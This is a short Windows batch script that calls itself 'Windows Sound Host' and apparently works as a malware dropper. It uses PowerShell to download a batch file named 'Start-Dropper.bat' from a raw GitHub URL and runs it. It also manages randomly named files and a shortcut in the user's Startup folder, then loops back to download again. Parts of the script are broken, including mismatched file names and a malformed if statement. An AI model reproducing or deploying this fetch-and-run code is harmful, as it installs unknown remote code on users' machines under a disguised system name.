@echo off
set path1= %userprofile%\documents\"Windows Sound Host"

if "%1" == "Update" (
    Goto update

)
if exist %path1%\15a65da65s1d8w86s51d8aw.vbs(
    goto update
)



:Download
powershell cd %userprofile%\documents; invoke-WebRequest 'https://raw.githubusercontent.com/LONG-BAT/Sounds-/refs/heads/main/Start-Dropper.bat' -Outfile ./Dropper.bat; Start-Process -FilePath "%userprofile%\documents\Dropper.bat"
exit


::fix ltr 



:update
cd %userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
del %userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\31513wd5w1d3a5wd185s3d51a.lnk
cd %userprofile%\documents
del %userprofile%\documents\Dropper.bat
cd %userprofile%\documents\"Windows Sound Host"
del 116161as5d1a5d3a21sd51aw13s1d85aw1d35.bat
del 315a65da65s1d8w86s51d8aw.bat
del %userprofile%\documents\update\update.txt
if exist %userprofile%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup\31513wd5w1d3a5wd185s3d51a.lnk (
    del %userprofile%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup\31513wd5w1d3a5wd185s3d51a.lnk
) 
Goto Download